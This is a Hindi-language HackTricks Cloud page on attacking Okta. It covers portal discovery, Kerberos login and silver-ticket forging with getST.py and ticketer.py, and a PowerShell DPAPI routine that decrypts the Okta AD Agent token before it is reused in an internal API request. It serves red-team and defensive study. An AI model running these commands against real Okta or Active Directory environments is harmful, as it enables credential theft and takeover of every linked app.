# Okta рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

Okta, Inc. рдПрдХ **рдкрд╣рдЪрд╛рди рдФрд░ рдкрд╣реБрдБрдЪ рдкреНрд░рдмрдВрдзрди рдХрдВрдкрдиреА** рд╣реИ рдЬреЛ рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рдЖрдзреБрдирд┐рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ** рдореЗрдВ рдорджрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рдЙрдб рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдФрд░ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ, рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╡реЗрдм рд╕реЗрд╡рд╛рдУрдВ рдФрд░ рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рдкрд╣рдЪрд╛рди рдирд┐рдпрдВрддреНрд░рдг рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП.

рдЙрдирдХреА рдореБрдЦреНрдп рд╕реЗрд╡рд╛, рдЬрд┐рд╕реЗ Okta Identity Cloud рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрддреНрдкрд╛рджреЛрдВ рдореЗрдВ рдПрдХрд▓ рд╕рд╛рдЗрди-рдСрди (SSO), рдорд▓реНрдЯреА-рдлреИрдХреНрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (MFA), рдЬреАрд╡рдирдЪрдХреНрд░ рдкреНрд░рдмрдВрдзрди, рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛, API рдкрд╣реБрдБрдЪ рдкреНрд░рдмрдВрдзрди, рдФрд░ рдЕрдзрд┐рдХ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ. рдпрд╣ рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рдЙрдирдХреЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде-рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣реБрдБрдЪ рдХреЛ рд╕рд░рд▓реАрдХреГрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╕реЗрд╡рд╛рдПрдБ рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдпрд╛ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рд╕реБрд▓рдн рдФрд░ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ.

Okta рдХреА рд╕реЗрд╡рд╛рдПрдБ рдЙрджреНрдпрдо рд╕рдВрджрд░реНрднреЛрдВ рдореЗрдВ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рд╕рд╛рде рд╣реА рдЫреЛрдЯреА рдХрдВрдкрдирд┐рдпреЛрдВ рдФрд░ рдбреЗрд╡рд▓рдкрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рднреА. рдпрд╣ рд╡реНрдпрд╡рд╕рд╛рдпреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХреНрд▓рд╛рдЙрдб рддрдХрдиреАрдХреЛрдВ рдХреЛ рдЕрдкрдирд╛рдиреЗ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рдиреЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИ. рд╕рд┐рддрдВрдмрд░ 2021 рддрдХ рдореЗрд░реЗ рдЬреНрдЮрд╛рди рдХреЗ рдЕрдиреБрд╕рд╛рд░, Okta рдкрд╣рдЪрд╛рди рдФрд░ рдкрд╣реБрдБрдЪ рдкреНрд░рдмрдВрдзрди (IAM) рдЙрджреНрдпреЛрдЧ рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЦрд┐рд▓рд╛рдбрд╝реА рдмрдирд╛ рд╣реБрдЖ рд╣реИ.

{% hint style="danger" %}
Okta рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреЛ рдмрд╛рд╣рд░реА рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╣реИ. рдпрджрд┐ рдЖрдк Okta рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ **рдкреНрд░рд╢рд╛рд╕рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛ рд╕реЗ **рдХрдВрдкрдиреА рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╕рднреА рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рдкрд╛рдПрдВрдЧреЗ**.
{% endhint %}

{% hint style="success" %}
Okta рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗрд╡рд▓-рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдБрдЪ** рдорд╛рдВрдЧрдиреА рдЪрд╛рд╣рд┐рдП.
{% endhint %}

### рд╕рд╛рд░рд╛рдВрд╢

рд╡рд╣рд╛рдБ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реЛрддреЗ рд╣реИрдВ (рдЬреЛ **Okta рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП **Identity Providers** рд╕реЗ рд▓реЙрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **Active Directory** рдпрд╛ LDAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ).\
рдпреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рд╕рдореВрд╣реЛрдВ** рдХреЗ рдЕрдВрджрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ.\
рдлрд┐рд░, **рдкреНрд░рдорд╛рдгреАрдХрд░реНрддрд╛** рд╣реЛрддреЗ рд╣реИрдВ: рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдХрд▓реНрдк рдЬреИрд╕реЗ рдХрд┐ рдкрд╛рд╕рд╡рд░реНрдб, рдФрд░ рдХрдИ 2FA рдЬреИрд╕реЗ рдХрд┐ WebAuthn, рдИрдореЗрд▓, рдлреЛрди, okta verify (рд╡реЗ рд╕рдХреНрд╖рдо рдпрд╛ рдЕрдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ)...

рдлрд┐рд░, Okta рдХреЗ рд╕рд╛рде рд╕рд┐рдВрдХреНрд░реЛрдирд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рд╣реЛрддреЗ рд╣реИрдВ. рдкреНрд░рддреНрдпреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ Okta рдХреЗ рд╕рд╛рде рдХреБрдЫ **рдореИрдкрд┐рдВрдЧ** рд╣реЛрдЧрд╛ рдЬрд╛рдирдХрд╛рд░реА рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдЬреИрд╕реЗ рдХрд┐ рдИрдореЗрд▓ рдкрддреЗ, рдкрд╣рд▓реЗ рдирд╛рдо...). рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкреНрд░рддреНрдпреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ **Authentication Policy** рдХреЗ рдЕрдВрджрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ **рдкрд╣реБрдБрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рди **рдкреНрд░рдорд╛рдгреАрдХрд░реНрддрд╛рдУрдВ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ.

{% hint style="danger" %}
рд╕рдмрд╕реЗ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рднреВрдорд┐рдХрд╛ **Super Administrator** рд╣реИ.

рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ Okta рдХреЛ Administrator рдкрд╣реБрдБрдЪ рдХреЗ рд╕рд╛рде рд╕рдордЭреМрддрд╛ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╕рднреА **apps рдЬреЛ Okta рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддреЗ рд╣реИрдВ** рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛ рд╕реЗ **рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ**.
{% endhint %}

## рд╣рдорд▓реЗ

### Okta рдкреЛрд░реНрдЯрд▓ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдЖрдорддреМрд░ рдкрд░ рдХрд┐рд╕реА рдХрдВрдкрдиреА рдХрд╛ рдкреЛрд░реНрдЯрд▓ **companyname.okta.com** рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрдЧрд╛. рдпрджрд┐ рдирд╣реАрдВ, рддреЛ **companyname** рдХреЗ рд╕рд░рд▓ **рд╡рд┐рд╡рд┐рдзрддрд╛рдУрдВ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ. рдпрджрд┐ рдЖрдк рдЗрд╕реЗ рдирд╣реАрдВ рдвреВрдБрдв рдкрд╛рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╕рдВрдЧрдарди рдХреЗ рдкрд╛рд╕ **`okta.companyname.com`** рдЬреИрд╕рд╛ **CNAME** рд░рд┐рдХреЙрд░реНрдб рд╣реЛ рдЬреЛ **Okta рдкреЛрд░реНрдЯрд▓** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реЛ.

### Kerberos рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Okta рдореЗрдВ рд▓реЙрдЧрд┐рди

(рд╣рдорд▓рд╛ [**рдпрд╣рд╛рдБ рд╕реЗ**](https://trustedsec.com/blog/okta-for-red-teamers) рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ).

рдпрджрд┐ **`companyname.kerberos.okta.com`** рдЬреИрд╕рд╛ рдбреЛрдореЗрди рдореМрдЬреВрдж рд╣реИ, рддреЛ рдХрдВрдкрдиреА рдХреЗ рднреАрддрд░ Okta рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП kerberos рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ. рдпрд╣ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдорддреМрд░ рдкрд░ Windows рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ Okta рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП MFA рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ.

Okta рддрдХ рдкрд╣реБрдБрдЪ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП Kerberos рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ AD env рдореЗрдВ рдЪрд▓рд╛рдХрд░ рднреА рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
AD рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдкреНрдд рдЯрд┐рдХрдЯ рдХреЗ рд╕рд╛рде, рд╣рдореЗрдВ рдЗрд╕реЗ Rubeus рдпрд╛ Mimikatz рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд╛рд░реЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реЛрд╕реНрдЯ рдкрд░ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдЖрдкрдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ `clientname.kerberos.okta.com` рдХреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдореЗрдВ "рдЗрдВрдЯреНрд░рд╛рдиреЗрдЯ" рд╕реБрд░рдХреНрд╖рд╛ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИред рдФрд░ рдлрд┐рд░, рд╣рдорд╛рд░реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ, рдпрджрд┐ рд╣рдо рдиреАрдЪреЗ рджрд┐рдП рдЧрдП URL рдХреЛ рд╣рд┐рдЯ рдХрд░рддреЗ рд╣реИрдВ, рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рд╣рдореЗрдВ рдПрдХ JSON рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИ рдЬреЛ `OK` рдкрд░рд┐рдгрд╛рдо рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ рдЬрдм Kerberos рдЯрд┐рдХрдЯ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Okta рдбреИрд╢рдмреЛрд░реНрдб рдкрд░ рдЬрд╛рдиреЗ рдкрд░, рдпрджрд┐ рд╕рдм рдХреБрдЫ рдареАрдХ рд╣реИ, рддреЛ рдЖрдк рд╕рд╛рдЗрди рдЗрди рд╣реЛ рдЬрд╛рдПрдВрдЧреЗред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рд╣рдо рд╡рд╛рд╕реНрддрд╡рд┐рдХ Okta рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ рдЬреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ SPN рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╣рдо Silver Ticket рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдзреНрдпрд╛рди рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпреЛрдВрдХрд┐ Okta рдХреЗрд╡рд▓ AES рдХреЛ рдЯрд┐рдХрдЯ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рд╣рдореЗрдВ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ AES рдХреБрдВрдЬреА рдпрд╛ рдкреНрд▓реЗрдирдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░ рд╕рдХреЗрдВ:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`testuser` рдХреЗ рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░рд╛ рдЯрд┐рдХрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

рдФрд░ рдлрд┐рд░ рд╕реЗ, рдЗрд╕реЗ рд╣рдорд╛рд░реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Okta рдХреЛ рднреЗрдЬреЗрдВ:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Okta AD Agent рдХрд╛ Hijacking

(рд╣рдорд▓рд╛ [**рдпрд╣рд╛рдБ рд╕реЗ**](https://trustedsec.com/blog/okta-for-red-teamers) рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ).

рдпрджрд┐ рдЖрдк рдПрдХ рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪрддреЗ рд╣реИрдВ рдЬреЛ Okta AD Agent рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдПрдЬреЗрдВрдЯ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреЛ Okta рдореЗрдВ рд╕рд┐рдВрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИ, рд╕рд╛рде рд╣реА Okta рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЙрддреНрддрд░ рджреЗрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреЛрд░реНрдЯрд▓ рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рддреЗ рд╣реИрдВред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдПрдЬреЗрдВрдЯ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
рд╣рдо `OktaAgentService.exe.config` рдкрд░ рдПрдХ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВрдЧреЗ, рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк XML рдмрд┐рдЯреНрд╕ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Base64 рдореЗрдВ рдПрдиреНрдХреЛрдбреЗрдб `AgentToken` рд╡рд╣ рдЬрдЧрд╣ рд╣реИ рдЬрд╣рд╛рдБ рд╣рдорд╛рд░реА рдирдЬрд░ рд╣реИред рдЕрдЧрд░ рд╣рдо `OktaAgentService.exe` рдХреЛ dnSpy рдореЗрдВ рдЦреЛрд▓рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпреЗ рдорд╛рди рдХреИрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдмрд┐рд▓реНрдХреБрд▓ рд╕рд╣реА.. рдЕрдЪреНрдЫрд╛ рдкреБрд░рд╛рдирд╛ DPAPI! `RandomEntropy` рдорд╛рди рдХреЛ рдирд┐рдореНрди рдореВрд▓реНрдп рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рдЗрд╕ Base64 рдПрдиреНрдХреЛрдбреЗрдб XML рдорд╛рди рдХреЛ рдирд┐рдореНрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
DPAPI рдорд╛рд╕реНрдЯрд░ рдХреА рдЬреЛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ рд╡рд╣ "Okta AD Agent" рд╕реЗрд╡рд╛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрдкрд░реЛрдХреНрдд рдХрд╛рд░реНрдп рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдпрд╛ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП рдорд╛рд╕реНрдЯрд░ рдХреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `OktaAgentService.exe.config` рдореЗрдВ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рджреЛ рдФрд░ XML рдлреАрд▓реНрдбреНрд╕ рд╣реИрдВ, `APPID` рдФрд░ `AGENTID`ред `AgentToken` рдХреЗ рд╕рд╛рде рдорд┐рд▓рдХрд░, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ `GET` рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
